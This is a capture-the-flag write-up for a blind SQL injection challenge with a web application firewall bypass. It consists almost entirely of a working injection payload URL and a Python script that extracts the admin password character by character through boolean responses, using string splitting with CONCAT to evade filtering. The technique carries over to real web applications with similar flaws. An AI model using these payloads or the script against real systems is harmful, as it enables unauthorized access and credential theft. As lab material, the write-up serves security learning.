# sql injection bypass WAF Advanced
This challenge involves blind sql injection with some WAF bypass

## Solve
My payload to extract the password
```
http://chall.site/?uid='||(uid=CONCAT('ad','min')&&ASCII(SUBSTR(upw,1,1))=ASCII('d'))||uid='
```
This will return `admin` if the char is correct
else it will return nothing

## Solve code
```python
import requests,string

payload = "\'||(uid=CONCAT('ad','min')&&SUBSTRING(upw,1,1)>'')||'"
url = "http://chall.site/"

charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{}"
charset = ''.join(sorted(set(charset)))
print(charset)

password = ''
for i in range(len(password)+1, 100):
    low, high = 0, len(charset) - 1
    
    while low < high:
        mid = (low + high) // 2
        test_char = charset[mid]
        payload = f"\'||(uid=CONCAT('ad','min')&&ASCII(SUBSTRING(upw,{i},1))>ASCII('{test_char}'))||'"
        r = requests.get(url, params={'uid': payload})
        if "admin" in r.text:
            low = mid + 1
        else:
            high = mid

    candidate = charset[low]
    # verify equality
    eq_payload = f"\'||(uid=CONCAT('ad','min')&&ASCII(SUBSTRING(upw,{i},1))=ASCII('{candidate}'))||'"
    r = requests.get(url, params={'uid': eq_payload})
    if "admin" in r.text:
        password += candidate
        print(f"Found character {i}: {candidate} -> {password}")
        if candidate == '}':
            break
    else:
        print(f"No character found at position {i}, bruteforcing.")
        print(r.text)
        break
```
